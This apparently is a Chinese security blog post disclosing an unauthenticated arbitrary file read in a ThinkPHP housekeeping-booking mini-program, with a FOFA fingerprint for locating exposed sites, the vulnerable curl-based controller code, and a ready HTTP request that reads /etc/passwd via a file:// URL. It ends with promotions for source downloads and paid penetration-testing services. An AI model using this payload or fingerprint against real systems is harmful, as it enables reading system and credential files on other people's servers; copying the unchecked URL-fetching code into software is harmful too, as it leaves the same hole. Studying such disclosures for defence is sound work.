#  【1day】某家政上门预约小程序系统存在前台任意文件读取漏洞   
原创 Mstir  星悦安全   2024-12-19 05:26  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**thinkphp家政上门预约服务小程序家政保洁师傅上门服务小程序上门服务在线派单+安装教程 上门预约服务派单小程序家政小程序同城预约开源代码独立版+安装教程**  
  
**Fofa指纹:"/static/default/wap/css/base.css" && "家政"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5evZO99OT0s3ySemtHxax8eE2dNHLhticSZCQsKgPsFicjc2jyfuHMJgqgjAVcUWicTQrKoPTDrnRvibQ/640?wx_fmt=jpeg&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5evZO99OT0s3ySemtHxax8eqA4OSkVicdC961FokFEsguO6c6X1XHtSWpSDHFpvHgTt07r0Soj6FBw/640?wx_fmt=jpeg&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5evZO99OT0s3ySemtHxax8ezlsq5RxTxubNicVe7NjUuQnxXuC7ybjOkibp5XJzUVBydiarcNr5xUUGg/640?wx_fmt=jpeg&from=appmsg "")  
  
**框架:ThinkPHP 5.1.0 Debug:True**  
## 0x01 漏洞分析&复现  
位于 /weixin/controller/Index.php 控制器的httpRequest方法存在curl_exec函数，且传参url均可控，导致漏洞产生.```
//请求数据public function httpRequest($url,$data = null){  $curl = curl_init();  curl_setopt($curl,CURLOPT_URL,$url);  curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,FALSE);  curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,FALSE);  if(!empty($data)){    curl_setopt($curl,CURLOPT_POST,1);    curl_setopt($curl,CURLOPT_POSTFIELDS,$data);  }  curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);  curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);  $output = curl_exec($curl);  curl_close($curl);  return $output;}
```  
  
Payload:  
  
```
GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/2Host: 127.0.0.1Cache-Control: max-age=0Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5evZO99OT0s3ySemtHxax8e9KKhA1vIfoicZJZ4VEmibXbWDcHNtm6ZSoR4vNPicxW5japiaI07CZBDTg/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**家政上门源码关注公众号发送 241219 获取!**  
  
  
  
  
  
****  
**承接代码审计，众测，驻场，渗透测试，攻防演练等项目，CNVD证书全网最低价+VX: Lonely3944**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
